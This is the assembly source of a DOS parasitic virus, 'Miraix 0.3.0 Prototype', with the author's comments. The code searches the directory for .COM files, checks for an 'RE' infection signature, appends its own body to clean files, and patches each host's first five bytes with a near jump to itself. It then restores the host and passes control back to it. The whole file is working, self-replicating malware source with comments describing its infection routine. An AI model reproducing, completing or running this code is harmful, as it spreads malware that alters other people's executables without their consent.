; Miraix 0.3.0 Prototype - Parasitic Virus 
; Coded by Falsedeer, 2022/03/04
;
; DESC: This version of virus, restores the host's code right after its execution,
; in order to avoid switching the vars in memory. By this way, it would be possible 
; for the virus to put new value into var: hostheader, to infect other files before
; the host executing process.
;
; Quite sure that all parts of code are functional, but I haven't setup the code for 
; the infecting process.
;
; UPDATE 2022/03/07: pretty sure that the virus appending part works.

.model small
.CODE
.386
virsize EQU (OFFSET finish) - (OFFSET init)

ORG 100h
init:                                             ;preserving 5 bytes to overwrite, if current virus doesn't have a host
    NOP
    NOP
    NOP                                           ;this area will be overwrite during host execution.
    NOP
    NOP
    
vir_start:                                        ;the real start of the virus
    call locate                                   ;put the absolute return addr(locate) into stack

locate:
    pop di
    sub di, OFFSET locate                         ;absolute ret addr - original offset = virus offset
    
prep_host:                                        ;prepare for the restore of the host program
    mov bx, 100h
    mov cx, 5
    push si
    xor si, si
    push bp
    mov bp, di

restore:                                          ;restore the first 5 bytes of the host program
    xor al, al
    mov al, byte PTR hostheader[bp+si]
    mov byte PTR [bx+si], al
    inc si
    Loop restore
    pop bp
    pop si

init_frame:
    push bp
    sub sp, 100h                                   ;reserve 100h for stack frame
    mov bp, sp                                     ;make bp as stack index      
    
set_dta:
    mov ah, 1ah
    mov dx, bp                                     ;set DTA in the stack frame
    int 21h   

;================================ [file search handler] ======================================

init_search:
    mov ah, 4eh
    xor cx, cx
    lea dx, filetype[di]
    int 21h
    jc ret_ctrl
    jmp get_byte                                   ;getbyte if file exist
    
search_next:
    mov ah, 4fh
    int 21h
    jc ret_ctrl
    
get_byte:                                          ;get the first 5 bytes of the found file
    mov ah, 3dh                                    ;3dh - open file
    mov al, 2                                      ;read / write access
    lea dx, [bp+1eh]
    int 21h
    
    xchg bx, ax
    mov ah, 3fh                                    ;read file, save first five bytes into var: newheader
    mov cx, 5
    lea dx, hostheader[di]
    int 21h

chkfile1:                                          ;check if there's the near jump(0E9h)
    cmp byte PTR hostheader[di], 0E9h
    jnz status_uninfected                          ;not match
    mov byte PTR status[di], 1                     ;if match, manualy set status to infected
    
chkfile2:                                          ;check if there's signature: RE
    cmp word PTR hostheader[di+3], 'ER' 
    jnz status_uninfected                          ;not match
    mov byte PTR status[di], 1

    mov ah, 3eh                                    ;close file, if the file is already infected
    int 21h
    stc
    jmp search_next

; ==================================== [file infect routine] ==================================    
    
infect:
    mov ah, 3dh                                    ;re-open the file 
    mov al, 2
    lea dx, [bp+1eh]
    int 21h
    xchg ax, bx

append:                                            ;append virus to the end of host
    mov ah, 42h
    mov al, 2
    xor cx, cx
    xor dx, dx
    int 21h

    mov ah, 40h
    mov cx, virsize
    lea dx, init[di]
    int 21h

alter:
    mov byte PTR [alterheader+di], 0E9h             ;near jump instruction(E9)

    mov ax, [bp+1ah]                                ;file size
    add ax, (OFFSET vir_start) - (OFFSET init) - 3  ;calcute the distance for near jump
    mov word PTR [alterheader+di+1], ax             ;write the distance of near jump    

    mov word PTR [alterheader+di+3], 'ER'           ;write 'RE' to mark the infection  

overwrite:
    mov ah, 42h                                     ;re-point to the start of host file
    xor al, al
    xor cx, cx
    xor dx, dx
    int 21h

    mov ah, 40h
    mov cx, 5
    lea dx, [alterheader+di]                        ;use the alterheader to overwrite the first 5 byte of the host
    int 21h

infect_end:
    mov ah, 3eh                                     ;re-close file
    int 21h
    clc                                             ;clear carry flag, prepare for next search
    jmp search_next                                ;loop to search_next
; ================================ [control transfer and markup] ===============================    
    
ret_ctrl:
    pop bp                                         ;return control to host
    add sp, 100h         
    mov ax, 100h                                   ;setting ret addr
    push ax
    ret

status_infected:                                   ;#DESC: shortcut to switch file status(infected / 1)
    mov byte PTR status[di], 1
    jmp search_next

status_uninfected:
    call show_status
    mov ah, 3eh                                    ;close file, and goto yhe fucking infection process
    int 21h                                        ;#DESC: shortcut to switch file status(uninfected / 0)
    mov byte PTR status[di], 0
    jmp infect    
    
; ===============================[Self-Defined Procedure]===================================
print PROC                                         ;#DESC: for debugging usage
    mov ah, 40h
    mov bx, 1
    mov cx, 10
    lea dx, [bp+1eh]
    int 21h
    ret
print ENDP

flagme PROC                                        ;#DESC: for debugging usage
    mov ah, 09h
    lea dx, msg3[di]
    int 21h
    ret
flagme ENDP

show_status PROC                                   ;#DESC: for debugging usage
    cmp byte PTR status[di], 1
    jnz notinfected

infected:
    mov ah, 09h 
    lea dx, msg[di]
    int 21h
    jmp ret_show_status

notinfected:
    mov ah, 09h
    lea dx, msg2[di]
    int 21h

ret_show_status:
    ret
show_status ENDP
; ===============================[Self-Defined Variable]=====================================
hostheader db 0cdh,20h,?,?,?            ;storage for host's original first 5 bytes
alterheader db 5 dup(?)                 ;tmp storage for the first 5 byte to be written
filetype db "*.com",0                   ;targeting com file
status db 0                             ;0 = uninfected, 1 = infected
msg db 13,10,"infected !",13,10,"$"
msg2 db 13,10,"uninfected !",13,10,"$"
msg3 db 13,10,"I am infected!$"
; ==========================================================================================
finish:
end init
